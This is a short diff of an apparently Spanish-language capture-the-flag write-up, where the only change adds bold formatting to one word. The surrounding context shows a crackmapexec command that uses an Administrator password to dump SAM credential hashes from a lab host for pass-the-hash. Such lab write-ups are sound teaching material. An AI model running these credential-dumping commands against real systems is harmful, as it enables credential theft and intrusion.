@@ -794,7 +794,7 @@ Info: Establishing connection to remote endpoint
 
 ## Dumping SAM hashes
 
-- Aquí tenemos los hashes de algunos usuarios para hacer `pass the hash`.
+- Aquí tenemos los hashes de algunos **usuarios** para hacer `pass the hash`.
 
 ```bash
 ➜  content crackmapexec smb 10.129.116.26 -u 'Administrator' -p '4dD!5}x/re8]FBuZ' --sam
